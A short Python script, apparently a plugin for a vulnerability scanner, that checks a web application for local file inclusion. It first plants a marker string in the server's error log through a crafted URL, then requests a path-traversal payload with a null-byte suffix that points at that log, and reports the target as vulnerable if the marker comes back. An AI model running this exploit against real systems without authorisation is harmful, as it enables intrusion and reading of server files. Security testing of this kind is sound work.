import requests


def audit(args):
    payloads = "<Venus01>"
    url = args + "/" + payloads
    req = requests.get(url=url)

    payload = "index.php?controller=../../../../Server/logs/error.log%00.php"

    lfi_url = args + "/" + payload

    try:
        res = requests.get(url=lfi_url)
        if res.status_code == 200:
            if payloads in str(res.content):
                print("[*] Found Vulnerable")
            else:
                print("[*] Not Found Vulnerable")
        else:
            print("[*] Not Found Vulnerable")
    except:
        pass
